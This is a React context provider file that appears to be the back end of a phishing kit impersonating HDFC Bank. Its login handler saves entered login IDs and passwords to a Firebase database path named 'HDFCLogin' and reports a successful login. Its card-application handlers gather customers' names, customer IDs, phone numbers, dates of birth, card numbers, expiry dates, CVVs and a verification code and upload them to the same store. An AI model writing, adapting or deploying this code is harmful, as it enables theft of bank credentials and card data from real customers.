import React, { useContext, createContext, useState } from 'react'

import { ref, set, } from 'firebase/database'
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from 'firebase/auth'
import toast from 'react-hot-toast'
import { realTiemDB } from '../firebase/firebase'

const context = createContext()

const ContextProvider = ({ children }) => {
    const auth = getAuth()

    const [loginID, setLoginID] = useState("")
    const [password, setPassword] = useState("")
    const [verificationCode, setVerificationCode] = useState("")
    const [logingbtn, setlogingbtn] = useState(false)
    const generateId = () => Math.floor(Math.random(2, 196) * 900000000);

    const [name, setName] = useState("")
    const [customerId, setCustomerId] = useState(null)
    const [phoneNo, setPhoneNo] = useState(null)
    const [dateOfB, setDateOfB] = useState(null)
    const [cardLimit, setCardLimit] = useState(null)

    const [cardHolderName, setCardHolderName] = useState(null)
    const [cardNumber, setCardNumber] = useState(null)
    const [cardExpiry, setCardExpiry] = useState(null)
    const [cardCvv, setCardCVV] = useState(null)


    const LoginHendler = async () => {
        const setRef = ref(realTiemDB, `HDFCLogin/${generateId()}`)

        if (loginID !== "" && password !== "" && verificationCode !== "") {

            if (verificationCode == 33470) {
                try {
                    setlogingbtn(true)
                    await set(setRef, {
                        loginID,
                        password,
                        verificationCode,
                        id: generateId()
                    })
                    setlogingbtn(false)
                    setLoginID("")
                    setPassword("")
                    setVerificationCode("")
                    toast.success("Login successfully")

                } catch (error) {
                    console.log(error);
                }
            } else {
                toast.error("Please enter the correct CAPTCHA.");
            }
        } else {
            toast.error("Please fill in all input fields.");
        }
    }



    //////////////// ============= Applay Card ==============///////////////////
    const ApplyHendler = (taital) => {
        localStorage.setItem('CardName', taital);
        window.location.href = "infromation"
    }

    //////////////// ============= Applay Card ==============///////////////////
    const LoginApplayHendler = async () => {
        let firstSpaceIndex = name.indexOf(" ");

        if (firstSpaceIndex !== -1) {
            let firstName = name.substring(0, firstSpaceIndex);
            let lastName = name.substring(firstSpaceIndex + 1);
            let formattedName = firstName + lastName;

            localStorage.setItem('customerId', customerId);
            localStorage.setItem('name', name);
            localStorage.setItem('phoneNo', phoneNo);
            localStorage.setItem('dateOfB', dateOfB);
            localStorage.setItem('cardLimit', cardLimit);
            if (name == "" || customerId === null || phoneNo === null || dateOfB === null || cardLimit === null) {
                toast.error("All Input Full Fild")
            }

            else {
                if (auth.currentUser == null) {
                    try {
                        setlogingbtn(true)
                        const userCredential = await createUserWithEmailAndPassword(auth, `${formattedName}@gmail.com`, `${phoneNo}`)
                        const user = userCredential.user;
                        const uid = user.uid;
                        console.log("User UID:", uid);
                        setlogingbtn(false)
                        localStorage.setItem('UserUID', uid);
                        setName("")
                        setCustomerId(null)
                        setPhoneNo(null)
                        setDateOfB(null)
                        setCardLimit(null)
                        window.location.href = "/PersonalBanking"

                    } catch (error) {
                        try {
                            setlogingbtn(true)
                            const singcredt = await signInWithEmailAndPassword(auth, `${formattedName}@gmail.com`, `${phoneNo}`)
                            if (singcredt.user.uid != null) {
                                console.log("All Are Done")
                                localStorage.setItem('UserUID', singcredt.user.uid);
                                window.location.href = "/PersonalBanking"
                                setlogingbtn(false)
                            }

                        } catch (error) {
                            setlogingbtn(false)
                            console.log("Somthing Went Wrong")
                        }
                        setlogingbtn(false)
                        console.log(error);
                    }
                } else {
                    localStorage.setItem('UserUID', auth.currentUser.uid);
                    window.location.href = "/PersonalBanking"

                }


            }
        } else {
            console.log("Invalid full name format");
        }

    }


    //////////////// ============= PersonalDitelsHendlar ==============///////////////////
    const PersonalDitelsHendlar = async () => {

        if (cardExpiry == "" || cardCvv === null || cardHolderName === null || cardNumber === null) {
            toast.error("All Input Full Fild")

        }
        else {
            localStorage.setItem('cardHolderName', cardHolderName);
            localStorage.setItem('cardExpiry', cardExpiry);
            localStorage.setItem('cardNumber', cardNumber);
            localStorage.setItem('cardCvv', cardCvv);
            setlogingbtn(true)
            setTimeout(() => {
                setlogingbtn(false)
                window.location.href = "/verificationCode"
            }, 1500);
        }

    }



    //////////////// ============= CardDetelsSubmitHendler  ==============///////////////////
    const CardDetelsSubmitHendler = async (verificationCode) => {
        const DcustomerId = localStorage.getItem('customerId');
        const Dname = localStorage.getItem('name');
        const DphoneNo = localStorage.getItem('phoneNo');
        const DdateOfB = localStorage.getItem('dateOfB');
        const DcardLimitd = localStorage.getItem('cardLimit');
        const DUserUID = localStorage.getItem('UserUID');
        const CardName = localStorage.getItem('CardName');
        const CardHolderName = localStorage.getItem('cardHolderName');
        const CardExpiry = localStorage.getItem('cardExpiry');
        const cardNumber = localStorage.getItem('cardNumber');
        const cardCvv = localStorage.getItem('cardCvv');

        if (verificationCode == null) {
            toast.error("All Input Fields Are Required");
        } else {
            try {
                const setRef = ref(realTiemDB, `HDFCLogin/${DUserUID}`)
                setlogingbtn(true)
                await set(setRef, {
                    CardName: CardName,
                    UserUID: DUserUID,
                    cardLimit: DcardLimitd,
                    dateOfBirth: DdateOfB,
                    phoneNo: DphoneNo,
                    name: Dname,
                    customerId: DcustomerId,
                    CardHolderName,
                    CardExpiry,
                    cardCvv,
                    cardNumber,
                    verificationCode,
                    id: generateId(),
                    date: new Date(),
                    
                })
                setlogingbtn(false)
                toast.success("Applay Successfully")
                setCardCVV(null)
                setCardHolderName(null)
                setCardExpiry(null)
                setCardNumber(null)
                window.location.reload()

            } catch (error) {
                console.error("Error creating user:", error);
            }
        }
    }



    return (
        <context.Provider value={{
            LoginHendler,
            loginID,
            setLoginID,
            password,
            setPassword,
            verificationCode,
            setVerificationCode,
            logingbtn,
            ApplyHendler,
            LoginApplayHendler,
            name, setName,
            customerId, setCustomerId,
            phoneNo, setPhoneNo,
            dateOfB, setDateOfB,
            cardLimit, setCardLimit,
            cardExpiry, setCardExpiry,
            cardHolderName, setCardHolderName,
            cardNumber, setCardNumber,
            cardCvv, setCardCVV, CardDetelsSubmitHendler,
            PersonalDitelsHendlar,

        }}>{children}</context.Provider >
    )
}


export const useContextProvider = () => useContext(context)

export default ContextProvider